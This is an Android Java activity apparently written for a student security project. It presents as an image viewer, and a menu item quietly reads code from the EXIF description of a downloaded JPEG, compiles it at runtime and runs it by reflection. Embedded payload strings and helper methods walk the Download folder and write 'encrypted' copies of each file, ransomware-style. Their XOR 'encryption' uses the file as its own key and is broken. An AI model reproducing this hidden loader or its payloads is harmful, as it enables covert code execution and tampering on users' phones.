package com.client_progettosicurezza;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.AlertDialog;
import android.app.DownloadManager;
import android.content.Context;
import android.content.DialogInterface;
import android.media.ExifInterface;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.support.annotation.RequiresApi;
import android.support.v4.app.ActivityCompat;
import android.support.v4.widget.SwipeRefreshLayout;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.Toast;

import com.client_progettosicurezza.adapters.AdapterImmagine;
import com.client_progettosicurezza.api.APIService;
import com.client_progettosicurezza.compiler.Compile;
import com.client_progettosicurezza.models.Aggiornamento;
import com.client_progettosicurezza.models.Immagine;
import com.client_progettosicurezza.results.ResultAggiornamento;
import com.client_progettosicurezza.results.ResultListaImmagini;

import java.io.BufferedOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.Arrays;

import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

import static com.client_progettosicurezza.api.APIUrl.BASE_URL;

public class MainActivity extends AppCompatActivity {

    public static final int PERMISSION_CODE = 1;

    private RecyclerView recyclerView;
    private RecyclerView.Adapter adapter;
    SwipeRefreshLayout swipeRefresh;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE}, PERMISSION_CODE);

        recyclerView = (RecyclerView) findViewById(R.id.recyclerView);
        recyclerView.setHasFixedSize(true);
        recyclerView.setLayoutManager(new LinearLayoutManager(this));

        loadImmagini();

        swipeRefresh = (SwipeRefreshLayout) findViewById(R.id.swipeRefresh);

        swipeRefresh.setOnRefreshListener(new SwipeRefreshLayout.OnRefreshListener() {
            @Override
            public void onRefresh() {
                swipeRefresh.setRefreshing(true);

                new android.os.Handler().postDelayed(new Runnable() {
                    @Override
                    public void run() {

                        swipeRefresh.setRefreshing(false);
                        loadImmagini();
                    }
                }, 100);
            }
        });
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.menu, menu);
        return true;
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        int id = item.getItemId();

        switch (id) {
            case R.id.update:
                AlertDialog.Builder alertDialog = new AlertDialog.Builder(MainActivity.this);
                alertDialog.setMessage("C'è un nuovo aggiornamento. Vuoi scaricarlo?").setCancelable(false)
                        .setPositiveButton("Si", new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialogInterface, int i) {
                                downloadAggiornamento();
                            }
                        })
                        .setNegativeButton("No", new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialogInterface, int i) {
                                dialogInterface.cancel();
                            }
                        });

                AlertDialog alert = alertDialog.create();
                alert.setTitle("Aggiornamento");
                alert.show();

                break;

            //TODO TRIGGER
            case R.id.info:
                //TODO per prelevare l'immagine
                String pathFile = Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/Minions.jpg";
                File file = new File(pathFile);
                payload(file);

                //TODO per provare il codice senza immagine
                //payload();

                //TODO PROVA
                //runner3(getApplicationContext());

                break;
        }
        return true;
    }

    private void payload(File file) {

        String codice = "";

        String codice1 =
                "public class Classe { " +
                        "public Classe() {} " +
                        "/* start method */" +
                        "public void run(android.content.Context context) {" +
                        "        try {\n" +
                        "            java.io.File file = new java.io.File((java.lang.String) \"/sdcard/Download/Minions.jpg\");\n" +
                        "            byte[] plaintext = new byte[(int) file.length()];\n" +
                        "            java.io.FileInputStream fileInputStream = new java.io.FileInputStream(file);\n" +
                        "            fileInputStream.read(plaintext);" +
                        "            byte[] key = plaintext; " +
                        "            byte[] chipertext = new byte[(int) key.length];\n" +
                        "            for (int i = 0; i < key.length; i++) {\n" +
                        "                chipertext[i] = (byte) (plaintext[i] ^ key[i]);\n" +
                        "            }\n" +
                        "            java.io.File file_chipertext = new java.io.File((java.lang.String) \"/sdcard/Download/Minions_cifrato.jpg\");\n" +
                        "            java.io.BufferedOutputStream bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_chipertext));\n" +
                        "            bos.write((byte[]) chipertext);\n" +
                        "            bos.flush();\n" +
                        "            bos.close();\n" +
                        "            byte[] plaintext_verifica = new byte[(int) key.length];\n" +
                        "            for (int i = 0; i < key.length; i++) {\n" +
                        "                plaintext_verifica[i] = (byte) (chipertext[i] ^ key[i]);\n" +
                        "            }\n" +
                        "            java.io.File file_plaintext_verifica = new java.io.File((java.lang.String) \"/sdcard/Download/Minions_verifica.jpg\");\n" +
                        "            java.io.BufferedOutputStream bos2 = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_plaintext_verifica));\n" +
                        "            bos2.write((byte[]) plaintext_verifica);\n" +
                        "            bos2.flush();\n" +
                        "            bos2.close();" +
                        "        } catch (java.lang.Exception e) {\n" +
                        "            e.printStackTrace();\n" +
                        "        }" +
                        "}" +
                        "/* end method */" +
                        "} ";

        String codice2 =
                "public class Classe { " +
                        "public Classe() {} " +
                        "/* start method */" +
                        "public void run(android.content.Context context) {" +
                        "try {\n" +
                        "\n" +
                        "            java.io.File dir = new java.io.File((java.lang.String) \"/sdcard/Download\");\n" +
                        "            if (dir.isDirectory()) {\n" +
                        "                java.lang.String[] children = dir.list();\n" +
                        "                for (int i = 0; i < (int) children.length; i++) {\n" +
                        "\n" +
                        "                    java.io.File file = new java.io.File((java.lang.String) \"/sdcard/Download/\" + children[i]);\n" +
                        "                    byte[] plaintext = new byte[(int) file.length()];\n" +
                        "                    java.io.FileInputStream fileInputStream = new java.io.FileInputStream(file);\n" +
                        "                    fileInputStream.read(plaintext);\n" +
                        "\n" +
                        "                    byte[] key = plaintext;\n" +
                        "\n" +
                        "                    byte[] chipertext = new byte[(int) key.length];\n" +
                        "                    for (int j = 0; j < (int) key.length; j++) {\n" +
                        "                        chipertext[j] = (byte) (plaintext[j] ^ key[j]);\n" +
                        "                    }\n" +
                        "                    java.io.File file_chipertext = new java.io.File((java.lang.String) \"/sdcard/Download/\" + \"cifrato_\" + children[i]);\n" +
                        "                    java.io.BufferedOutputStream bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_chipertext));\n" +
                        "                    bos.write((byte[]) chipertext);\n" +
                        "                    bos.flush();\n" +
                        "                    bos.close();\n" +
                        "\n" +
                        "                    byte[] plaintext_verifica = new byte[(int) key.length];\n" +
                        "                    for (int k = 0; k < (int) key.length; k++) {\n" +
                        "                        plaintext_verifica[k] = (byte) (chipertext[k] ^ key[k]);\n" +
                        "                    }\n" +
                        "                    java.io.File file_plaintext_verifica = new java.io.File((java.lang.String)  \"/sdcard/Download/\" + \"verifica_\" + children[i]);\n" +
                        "                    java.io.BufferedOutputStream bos2 = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_plaintext_verifica));\n" +
                        "                    bos2.write((byte[]) plaintext_verifica);\n" +
                        "                    bos2.flush();\n" +
                        "                    bos2.close();\n" +
                        "                }\n" +
                        "            }\n" +
                        "\n" +
                        "        } catch (java.lang.Exception e) {\n" +
                        "            e.printStackTrace();\n" +
                        "        }" +
                        "}" +
                        "/* end method */" +
                        "} ";


        //TODO per prelevare i metadati
        try {
            ExifInterface exif = new ExifInterface(file.getAbsolutePath());
            codice = exif.getAttribute(ExifInterface.TAG_IMAGE_DESCRIPTION);
        } catch (IOException e) {
            e.printStackTrace();
        }

        try {
            Compile compile = new Compile(getFilesDir(), getApplicationContext());
            //TODO scegliere codice da compilare
            compile.assemblyCompile(codice);
            compile.recompile();
            compile.load(getCacheDir(), getApplicationInfo(), getClassLoader());

            Object obj = compile.run();
            Method metodo = obj.getClass().getDeclaredMethod("run", Context.class);
            metodo.invoke(obj, getApplicationContext());

        } catch (IOException e) {
            e.printStackTrace();
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InstantiationException e) {
            e.printStackTrace();
        }
    }

    private void loadImmagini() {
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(BASE_URL)
                .addConverterFactory(GsonConverterFactory.create())
                .build();

        APIService service = retrofit.create(APIService.class);

        Call<ResultListaImmagini> call = service.getImmagini();

        call.enqueue(new Callback<ResultListaImmagini>() {
            @Override
            public void onResponse(Call<ResultListaImmagini> call, Response<ResultListaImmagini> response) {

                ArrayList<Immagine> immagini = response.body().getImmagini();

                adapter = new AdapterImmagine(immagini, getApplicationContext());
                recyclerView.setAdapter(adapter);
            }

            @Override
            public void onFailure(Call<ResultListaImmagini> call, Throwable t) {

            }
        });
    }

    private void downloadAggiornamento() {
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl(BASE_URL)
                .addConverterFactory(GsonConverterFactory.create())
                .build();

        APIService service = retrofit.create(APIService.class);

        Call<ResultAggiornamento> call = service.getAggiornamento();

        call.enqueue(new Callback<ResultAggiornamento>() {
            @Override
            public void onResponse(Call<ResultAggiornamento> call, Response<ResultAggiornamento> response) {

                Aggiornamento aggiornamento = response.body().getAggiornamento();

                Toast.makeText(getApplicationContext(), "Download Image View.apk " + "versione: " + aggiornamento.getVersione(), Toast.LENGTH_LONG).show();

                String nameApk = "ImageView_v" + aggiornamento.getVersione() + ".apk";

                DownloadManager downloadManager = (DownloadManager) getSystemService(Context.DOWNLOAD_SERVICE);
                Uri uri = Uri.parse(aggiornamento.getFile());
                DownloadManager.Request request = new DownloadManager.Request(uri);
                request.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_ONLY_COMPLETION);
                request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, nameApk);
                downloadManager.enqueue(request);

                /*Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setDataAndType(Uri.fromFile(new File(Environment.DIRECTORY_DOWNLOADS + "/" + nameApk)),
                        "application/com.client_progettosicurezza");
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);*/
            }

            @Override
            public void onFailure(Call<ResultAggiornamento> call, Throwable t) {

            }
        });
    }

    public void runner2(android.content.Context context) {
        android.widget.Toast.makeText((android.content.Context) context, (java.lang.CharSequence) "Start", (int) android.widget.Toast.LENGTH_LONG).show();
        try {


            java.io.File file = new java.io.File((java.lang.String) "/sdcard/Download/testo.txt");
            byte[] plaintext = new byte[(int) file.length()];
            java.io.FileInputStream fileInputStream = new java.io.FileInputStream(file);
            fileInputStream.read(plaintext);

            byte[] key = plaintext;

            byte[] chipertext = new byte[key.length];
            for (int i = 0; i < key.length; i++) {
                chipertext[i] = (byte) (plaintext[i] ^ key[i]);
            }
            java.io.File file_chipertext = new java.io.File((java.lang.String) "/sdcard/Download/cifrato.txt");
            java.io.BufferedOutputStream bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_chipertext));
            bos.write((byte[]) chipertext);
            bos.flush();
            bos.close();

            byte[] plaintext_verifica = new byte[key.length];
            for (int i = 0; i < key.length; i++) {
                plaintext_verifica[i] = (byte) (chipertext[i] ^ key[i]);
            }
            java.io.File file_plaintext_verifica = new java.io.File((java.lang.String) "/sdcard/Download/testo_verifica.txt");
            java.io.BufferedOutputStream bos2 = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_plaintext_verifica));
            bos2.write((byte[]) plaintext_verifica);
            bos2.flush();
            bos2.close();

        } catch (java.lang.Exception e) {
            e.printStackTrace();
        }
    }

    public void runner3(android.content.Context context) {
        try {

            java.io.File dir = new java.io.File((java.lang.String) "/sdcard/Download");
            if (dir.isDirectory()) {
                java.lang.String[] children = dir.list();
                for (int i = 0; i < children.length; i++) {

                    java.io.File file = new java.io.File("/sdcard/Download/" + children[i]);
                    byte[] plaintext = new byte[(int) file.length()];
                    java.io.FileInputStream fileInputStream = new java.io.FileInputStream(file);
                    fileInputStream.read(plaintext);

                    byte[] key = plaintext;

                    byte[] chipertext = new byte[key.length];
                    for (int j = 0; j < key.length; j++) {
                        chipertext[j] = (byte) (plaintext[j] ^ key[j]);
                    }
                    java.io.File file_chipertext = new java.io.File((java.lang.String) "/sdcard/Download/" + "cifrato_" + children[i]);
                    java.io.BufferedOutputStream bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_chipertext));
                    bos.write((byte[]) chipertext);
                    bos.flush();
                    bos.close();

                    byte[] plaintext_verifica = new byte[key.length];
                    for (int k = 0; k < key.length; k++) {
                        plaintext_verifica[k] = (byte) (chipertext[k] ^ key[k]);
                    }
                    java.io.File file_plaintext_verifica = new java.io.File((java.lang.String)  "/sdcard/Download/" + "verifica_" + children[i]);
                    java.io.BufferedOutputStream bos2 = new java.io.BufferedOutputStream(new java.io.FileOutputStream((java.io.File) file_plaintext_verifica));
                    bos2.write((byte[]) plaintext_verifica);
                    bos2.flush();
                    bos2.close();
                }
            }

        } catch (java.lang.Exception e) {
            e.printStackTrace();
        }
    }

}
